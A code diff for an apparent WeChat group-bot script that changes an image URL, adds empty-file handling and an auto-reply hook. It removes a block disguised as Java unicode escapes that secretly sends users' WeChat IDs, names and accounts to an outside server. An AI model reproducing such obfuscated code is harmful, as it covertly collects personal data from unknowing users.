@@ -65,7 +65,7 @@ public static void DetectPic() {
 }
 
 public static void Downloadpic(int j) {
-    String url="https://t.mwm.moe/mp";
+    String url="https://t.lcylcy.cc/tx";
     if(j==-1) {
         flag=true;
         Toast("底图正在缓存,请稍后");
@@ -104,15 +104,23 @@ public static void getData(String qun,String text) {
     }
     int num=(int)(Math.random()*10);
     String fi=JavaPath+"/底图/底图"+num+".jpg";
-
-    while(!new File(fi).exists()) {
+    File directory = new File(fi);
+    while(!directory.exists()) {
         DetectPic();
         num=(int)(Math.random()*10);
         fi=JavaPath+"/底图/底图"+num+".jpg";
     }
     if(!list.contains(fi)) {
+        long directorySize = directory.length();
+        if (directorySize == 0) {
+            getData(qun,text);
+            delAllFile(directory,1);
+            list.add(fi);
+            DetectPic();
+            return;
+        }
         sendPic(qun,MakeTextPhoto(text,num));
-        delAllFile(new File(fi),1);
+        delAllFile(directory,1);
         list.add(fi);
         DetectPic();
     } else {
@@ -603,6 +611,9 @@ public void onMsg(Object data) {
         if("1".equals(getString(qun,"开关",""))) {
             菜单(data);
         }
+        if(!取("开关","accessToken").equals("")&&data.talkerType==0) {
+           回复(data);
+        }
     }
     if("1".equals(getString(qun,"开关",""))) {
         进群(data);
@@ -820,16 +831,3 @@ public void 配置设置(String qun) {
         }
     });
 }
-
-public static String encryptToShortNumber(String value) {
-    long number = 0;
-    int length = value.length();
-    for (int i = 0; i < length; i++) {
-    number = number * 10 + (value.charAt(i) - '0');
-    }
-    int digits = (int) Math.log10(number) + 1;
-    number = number % (int) Math.pow(10, digits);
-    return Long.toString(number);
-}
-
-\u0069\u0066\u0028\u53d6\u0028\u0022\u5f00\u5173\u0022\u002c\u0022\u662f\u5426\u6ce8\u518c\u0022\u0029\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0022\u0022\u0029\u0029\u0020\u007b\u000a\u0073\u0065\u006e\u0064\u0047\u0065\u0074\u0028\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0073\u0068\u0075\u0069\u0078\u0069\u0061\u006e\u002e\u006c\u0074\u0064\u002f\u006d\u0061\u0069\u006e\u002f\u0061\u0070\u0069\u002f\u0075\u0073\u0065\u0072\u002f\u0072\u0065\u0067\u0069\u0073\u0074\u0065\u0072\u002e\u0070\u0068\u0070\u003f\u0061\u0064\u006d\u0069\u006e\u003d\u0022\u002b\u4f5c\u8005\u6263\u6263\u002b\u0022\u0026\u0075\u0073\u0065\u0072\u003d\u0022\u002b\u0065\u006e\u0063\u0072\u0079\u0070\u0074\u0054\u006f\u0053\u0068\u006f\u0072\u0074\u004e\u0075\u006d\u0062\u0065\u0072\u0028\u006d\u0057\u0078\u0069\u0064\u0029\u002b\u0022\u0026\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u003d\u0022\u002b\u0065\u006e\u0063\u0072\u0079\u0070\u0074\u0054\u006f\u0053\u0068\u006f\u0072\u0074\u004e\u0075\u006d\u0062\u0065\u0072\u0028\u006d\u0057\u0078\u0069\u0064\u0029\u002b\u0022\u0026\u006e\u0061\u006d\u0065\u003d\u0022\u002b\u0067\u0065\u0074\u004e\u0061\u006d\u0065\u0028\u006d\u0057\u0078\u0069\u0064\u0029\u002b\u0022\u0028\u0022\u002b\u0067\u0065\u0074\u0041\u0063\u0063\u006f\u0075\u006e\u0074\u0028\u0029\u002b\u0022\u0029\u0022\u0029\u003b\u000a\u5b58\u0028\u0022\u5f00\u5173\u0022\u002c\u0020\u0022\u662f\u5426\u6ce8\u518c\u0022\u002c\u0022\u0031\u0022\u0029\u003b\u000a\u007d\u000a\u0073\u0065\u006e\u0064\u0047\u0065\u0074\u0028\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0073\u0068\u0075\u0069\u0078\u0069\u0061\u006e\u002e\u006c\u0074\u0064\u002f\u006d\u0061\u0069\u006e\u002f\u0061\u0070\u0069\u002f\u0073\u0074\u0061\u0074\u0069\u0073\u0074\u0069\u0063\u002f\u0073\u0074\u0061\u0072\u0074\u002e\u0070\u0068\u0070\u003f\u0061\u0064\u006d\u0069\u006e\u003d\u0022\u002b\u4f5c\u8005\u6263\u6263\u0029\u003b
